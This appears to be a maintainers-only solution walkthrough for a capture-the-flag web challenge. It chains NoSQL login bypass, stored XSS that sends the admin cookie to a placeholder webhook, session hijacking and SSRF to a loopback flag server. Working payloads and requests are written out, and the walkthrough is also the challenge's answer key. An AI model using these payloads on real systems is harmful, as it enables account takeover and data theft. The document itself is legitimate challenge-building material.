# Attack Chain Walkthrough

> **MAINTAINERS ONLY — do not publish or distribute to players.**

---

## Stage 1 — NoSQL Injection

**Vulnerability:** `POST /login` passes the JSON body fields directly into a Mongoose `findOne` query without sanitizing operator keys.

**Sink (web/src/auth/router.ts):**
```typescript
const customer = await Customer.findOne({ email, password });
```

**Exploit:**

The login form submits JSON. Type `{"$gt":""}` into both the email and password fields, or send directly:

```http
POST /login HTTP/1.1
Content-Type: application/json

{"email": {"$gt": ""}, "password": {"$gt": ""}}
```

`$gt: ""` matches any non-empty string value — the query returns the first customer document regardless of credentials.

**Result:** HTTP 200 with `Set-Cookie: session=<token>`. The token grants access to `/dashboard`, `/map`, `/export`, `/settings`, `/support`.

**Why it cannot escalate to admin:** Administrators are not stored in the `customers` collection. The login query can only match customer documents. The `admin_session` cookie is generated independently at instance startup and installed only in the admin bot's browser.

---

## Stage 2 — Stored XSS

**Vulnerability:** The admin chat page renders message content via `innerHTML` with no sanitisation.

**Sink (web/public/js/admin-chat.js):**
```javascript
el.innerHTML = msg.content;  // intentional — no sanitisation
```

**CSP on `/admin/chat`:** `script-src 'unsafe-inline'`, `script-src-attr 'unsafe-inline'`, `img-src *`, `connect-src *` — deliberately relaxed to allow the XSS to execute and exfiltrate.

**Payload:**

The XSS payload must read `document.cookie` and send it to an external webhook. The `admin_session` cookie has `HttpOnly=false` intentionally.

Using an external webhook (e.g. webhook.site):
```
<img src=x onerror="fetch('https://your-webhook-url?c='+document.cookie)">
```

Submit via:
```http
POST /support HTTP/1.1
Cookie: session=<customer_session>
Content-Type: application/json

{
  "subject": "GIS data request",
  "content": "<img src=x onerror=\"fetch('https://your-webhook-url?c='+document.cookie)\">"
}
```

Alternatively, use the built-in capture inbox (no external webhook needed):
```
<img src=x onerror="this.closest('[data-message-id]').dataset&&fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:this.closest('[data-message-id]').dataset.messageId,value:document.cookie})})">
```

Then poll:
```http
GET /support/capture/<messageId> HTTP/1.1
Cookie: session=<customer_session>
```

---

## Stage 3 — Session Hijacking

**Mechanism:**
1. The admin bot visits `http://web:3000/admin/chat` every 8 seconds
2. The page renders all unvisited messages via `innerHTML`
3. The `onerror` fires when the browser tries to load the broken `<img src=x>`
4. `document.cookie` returns `admin_session=<token>` because `HttpOnly=false`
5. The token arrives at your webhook (or the `/capture` endpoint)

**Result:**
```
admin_session=86c5b20d62c402f2edb5a7b392f1be5c...
```

---

## Stage 4 — Admin Dashboard Access

Set the `admin_session` cookie in Burp and navigate:

```http
GET /admin/dashboard HTTP/1.1
Cookie: admin_session=86c5b20d62c402f2edb5a7b392f1be5c...
```

The middleware compares the cookie against `ADMIN_SESSION_TOKEN` — an exact match grants access to all `/admin/*` routes.

---

## Stage 5 — SSRF

**Vulnerability:** `POST /admin/tools/validate` accepts any HTTP/HTTPS URL and forwards it to the SSRF worker, which makes a real server-side HTTP request.

**Key insight:** The SSRF worker runs the flag server on its own loopback (`127.0.0.1:80`). When the worker fetches `http://127.0.0.1/flag.txt`, it hits its own flag server — not the web application's localhost.

**Exploit:**
```http
POST /admin/tools/validate HTTP/1.1
Cookie: admin_session=86c5b20d62c402f2edb5a7b392f1be5c...
Content-Type: application/json

{"url": "http://127.0.0.1/flag.txt"}
```

Also works with:
- `http://localhost/flag.txt`
- `http://0.0.0.0/flag.txt`

---

## Stage 6 — Flag

Response:
```json
{
  "status": "ok",
  "statusCode": 200,
  "body": "IGT{n0sql_xss_ssrf_pwn3d}\n"
}
```

---

## Isolation checkpoints

| Checkpoint | Enforcement |
|-----------|-------------|
| NoSQL injection cannot yield admin session | Admin not in `customers` collection |
| XSS doesn't fire on customer-facing pages | `escapeHtml()` on all customer templates |
| Admin session cannot be guessed | 48 random bytes, never logged, never in DB |
| SSRF cannot reach MongoDB | `ssrf-worker` not on `app-net` |
| SSRF cannot reach web application | `ssrf-worker` not on `proxy-net` or `app-net` |
| SSRF cannot reach internet | `flag-net` is `internal: true` |
| Flag unreachable from web container | Different container namespace — `127.0.0.1` is the worker's loopback |
| Player cannot reach flag directly | No published ports; different network namespace |
